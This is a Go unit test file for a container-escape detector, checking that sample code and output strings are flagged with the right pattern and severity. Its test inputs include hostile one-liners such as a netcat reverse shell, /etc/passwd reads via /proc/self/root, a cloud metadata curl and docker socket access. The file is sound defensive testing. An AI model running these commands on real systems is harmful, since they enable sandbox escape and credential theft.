package monitor

import (
	"testing"
)

func TestAnalyzeCode(t *testing.T) {
	d := NewEscapeDetector()

	tests := []struct {
		name         string
		code         string
		wantMinCount int // minimum number of detections
		wantPattern  string
	}{
		{"proc_self_root", `f = open("/proc/self/root/etc/passwd")`, 1, "proc_self_access"},
		{"cgroup breakout", `open("/sys/fs/cgroup/notify_on_release")`, 1, "container_breakout"},
		{"docker socket", `cat /var/run/docker.sock`, 1, "host_mount_access"},
		{"dirty_cow", `exploit = dirty_cow_payload()`, 1, "kernel_exploit"},
		{"metadata service", `curl 169.254.169.254/latest/meta-data/`, 1, "metadata_service"},
		{"reverse shell", `nc -e /bin/sh 10.0.0.1 4444`, 1, "reverse_shell"},
		{"cap_sys_admin", `capsh --caps="cap_sys_admin+eip"`, 1, "capability_abuse"},
		{"ptrace", `ptrace(PTRACE_ATTACH, pid, 0, 0)`, 1, "ptrace_attempt"},
		{"symlink race", `ln -s /proc/self/ns /tmp/escape`, 1, "symlink_race"},
		{"crypto miner", `pool.connect("stratum+tcp://pool.mining.com")`, 1, "crypto_miner"},
		{"clean code", `print("hello world")`, 0, ""},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			dets := d.AnalyzeCode(tt.code)
			if len(dets) < tt.wantMinCount {
				t.Errorf("got %d detections, want >= %d", len(dets), tt.wantMinCount)
				return
			}
			if tt.wantPattern != "" {
				found := false
				for _, det := range dets {
					if det.Pattern == tt.wantPattern {
						found = true
						break
					}
				}
				if !found {
					t.Errorf("pattern %q not found in detections: %v", tt.wantPattern, dets)
				}
			}
		})
	}
}

func TestAnalyzeOutput(t *testing.T) {
	d := NewEscapeDetector()

	tests := []struct {
		name         string
		output       string
		wantMinCount int
		wantSeverity string
	}{
		{"root access", "root:x:0:0:root:/root:/bin/bash", 1, "critical"},
		{"docker socket", "found: /var/run/docker.sock", 1, "critical"},
		{"containerd socket", "socket: containerd.sock listening", 1, "critical"},
		{"clean output", "hello world\n42\n", 0, ""},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			dets := d.AnalyzeOutput(tt.output)
			if len(dets) < tt.wantMinCount {
				t.Errorf("got %d detections, want >= %d", len(dets), tt.wantMinCount)
				return
			}
			if tt.wantSeverity != "" && len(dets) > 0 {
				if dets[0].Severity != tt.wantSeverity {
					t.Errorf("severity = %q, want %q", dets[0].Severity, tt.wantSeverity)
				}
			}
		})
	}
}

func TestSeverityString(t *testing.T) {
	tests := []struct {
		sev  Severity
		want string
	}{
		{SeverityLow, "low"},
		{SeverityMedium, "medium"},
		{SeverityHigh, "high"},
		{SeverityCritical, "critical"},
		{Severity(99), "unknown"},
	}

	for _, tt := range tests {
		t.Run(tt.want, func(t *testing.T) {
			if got := tt.sev.String(); got != tt.want {
				t.Errorf("Severity(%d).String() = %q, want %q", tt.sev, got, tt.want)
			}
		})
	}
}
